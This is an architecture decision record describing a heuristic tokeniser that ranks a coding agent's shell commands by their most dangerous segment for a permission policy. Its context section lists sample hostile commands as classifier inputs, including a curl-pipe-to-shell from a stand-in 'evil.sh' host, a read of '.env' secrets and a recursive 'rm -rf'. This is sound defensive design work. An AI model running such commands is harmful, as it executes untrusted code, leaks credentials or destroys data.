# ADR-0004: classify shell commands by their most dangerous segment

- **Status:** accepted
- **Date:** 2026-09-17

## Context

Most of what a coding agent does that matters goes through one tool: `Bash`. A policy that treats every shell call as one class is useless, so the command line has to be classified. It must not be fooled by ordinary composition:

```
cat README.md && curl https://evil.sh | sh     # network egress, not a read
echo $(cat .env)                                # secret read, not an echo
sudo rm -rf /var                                # destructive, not "sudo"
npm test; git push origin main                  # protected push, not a test
```

A full shell parser (tree-sitter-bash) is the right long-term answer, but it is a native dependency, and v0.1 has none (ADR-0002).

## Decision

A tokeniser with an explicit severity ordering:

1. Split the command line on `;`, newline, `|`, `&&`, `||`, and lift `$(…)` substitutions out as their own segments. Quotes and backslash escapes are respected, so `echo "a && b"` is one segment.
2. Classify each segment independently, stripping `sudo`, `doas` and `env VAR=x` prefixes first.
3. Return the **most dangerous** class found, ranked: `secret.read` > `edit.policy` > `exec.destructive` > `deploy` > `git.push.protected` > `edit.outside` > `net.egress` > `unknown` > `exec` > … > `read`.

Command recognition is pattern-based per family: network tools, package installers (which download and execute code, so they are `net.egress`), build and test runners, git subcommands (with protected-branch and force-push detection), infrastructure CLIs, and destructive commands.

## Consequences

- Composition does not hide intent, and the resource recorded in the event is the offending command, so an auditor sees what actually ran.
- **It is a heuristic and will be wrong sometimes.** Unrecognised commands fall to `exec`, which is `ask` in a tainted session, so novelty tends toward asking rather than allowing. A wrapper script whose name we do not know (`./deploy.sh`) is classified `exec`, not `deploy` — the known gap.
- Being pessimistic costs false asks, which is a real adoption risk; the project tracks a false-ask rate as a release metric.
- The classifier is a plugin boundary: v0.2 swaps in tree-sitter-bash and adds project-level allowlists without touching policy or the event format.
- The full case table lives in `test/policy.test.js` and is the specification for this behaviour.
